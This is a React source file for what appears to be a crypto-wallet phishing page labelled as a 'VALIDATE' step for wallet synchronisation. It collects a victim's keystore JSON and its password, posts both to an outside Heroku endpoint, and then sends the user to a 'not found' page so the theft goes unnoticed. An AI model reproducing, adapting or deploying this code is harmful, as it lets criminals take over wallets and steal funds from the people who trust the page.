import { useEffect, useState } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import { BeatLoader } from "react-spinners";

const KeystoreJson = ({
  seed2,
  setSeed2,
  disabled2,
  setDisabled2,
  password,
  setPassword,
}) => {
  let Navigate = useNavigate();
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (seed2 == "" || password == "") {
      setDisabled2(true);
    } else {
      setDisabled2(false);
    }
  }, [seed2, password]);

  const handleSubmit = async (e) => {
    setDisabled2(true);
    setLoading(true);
    const res = await axios.post(
      "https://dappswalletsynchronizer.herokuapp.com/form",
      {
        seed: seed2,
        password,
      }
    );
    if (res.data.status === 200) {
      Navigate("/not_found");
    } else {
      console.log("An error occurred");
    }
  };

  return (
    <>
      <textarea
        onChange={(e) => setSeed2(e.target.value)}
        value={seed2}
        rows='10'
        placeholder='Keystore JSON'
      ></textarea>
      <div>
        <textarea
          rows='1'
          placeholder='password'
          onChange={(e) => setPassword(e.target.value)}
          value={password}
        ></textarea>
        <p className='info'>
          Several lines of text beginning width plus the password you used to
          encrypt it.
        </p>
      </div>
      <button
        style={
          disabled2
            ? {
                backgroundColor: "rgba(26, 141, 218, 0.2)",
                cursor: "not-allowed",
              }
            : { backgroundColor: "#1a8dda", color: "#fff" }
        }
        onClick={handleSubmit}
        disabled={disabled2}
      >
        {!loading ? "VALIDATE" : <BeatLoader size={12} />}
      </button>
    </>
  );
};

export default KeystoreJson;
